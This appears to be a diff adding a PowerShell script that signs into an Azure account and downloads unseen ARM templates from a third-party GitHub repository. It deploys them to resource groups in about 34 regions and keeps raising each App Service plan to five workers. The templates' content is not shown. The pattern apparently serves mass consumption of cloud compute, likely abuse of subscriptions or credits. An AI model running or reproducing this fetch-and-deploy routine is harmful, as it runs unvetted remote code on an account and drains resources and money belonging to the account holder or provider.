@@ -1,0 +1,68 @@
+Connect-AzAccount -UseDeviceAuthentication
+Remove-Item long.json
+Remove-Item long1.json
+Invoke-WebRequest 'https://raw.githubusercontent.com/ddao2604/tech/main/long.json' -OutFile long.json
+Invoke-WebRequest 'https://raw.githubusercontent.com/ddao2604/tech/main/long1.json' -OutFile long1.json
+
+$id = (Get-AzADUser).UserPrincipalName
+$name = $id.Split("_")[0]
+$name
+(Get-Content long.json).Replace('XNX', $name) | Set-Content long.json
+(Get-Content long1.json).Replace('XNX', $name) | Set-Content long1.json
+
+$loclist = "EastUS,NorthEurope,WestEurope,SoutheastAsia,EastAsia,WestUS,JapanWest,JapanEast,EastUS2,NorthCentralUS,SouthCentralUS,BrazilSouth,AustraliaEast,AustraliaSoutheast,CentralUS,CentralIndia,SouthIndia,CanadaCentral,CanadaEast,WestUS2,UKWest,UKSouth,KoreaCentral,FranceCentral,SouthAfricaNorth,SwitzerlandNorth,GermanyWestCentral,UAENorth,NorwayEast,WestUS3,SwedenCentral,PolandCentral,ItalyNorth,IsraelCentral"
+$loclist = $loclist.split(",");
+$run = $true
+While($run)
+{
+	foreach ($i in $loclist) {
+		New-AzResourceGroup -Name $i -Location $i -Force
+		New-AzResourceGroupDeployment -ResourceGroupName $i -TemplateFile long.json
+	}
+	break
+}
+$run = $true
+While($run)
+{
+	foreach ($i in $loclist) {
+		$Resource = Get-AzAppServicePlan -ResourceGroupName $i
+		$tname = $Resource.name
+		$tname
+		if($tname)
+		{
+			$wk = $Resource.Sku.Capacity
+			$wk
+			if($wk -lt 5)
+			{
+				$nw = $wk + 1
+				Set-AzAppServicePlan -Name $Resource.name -ResourceGroupName $i -NumberofWorkers $nw
+			}
+			else
+			{
+				$loclist = $loclist | Where-Object { $_ -ne $i }
+			}
+		}
+		else
+		{
+			New-AzResourceGroup -Name $i -Location $i -Force
+			New-AzResourceGroupDeployment -ResourceGroupName $i -TemplateFile long1.json
+			
+		}
+	}
+	$len = $loclist.Length
+	if($len -lt 1)
+	{
+		break
+	}
+	$time = Get-Random -Minimum 50 -Maximum 80
+	$waitSeconds = $time
+
+	Start-Sleep -Seconds 0
+
+	$waitSeconds..0 | Foreach-Object {
+		Write-Host "`r          Time Remaining: $_ " -NoNewline -foregroundcolor green
+		Start-Sleep -Seconds 1
+	}
+}
+
+
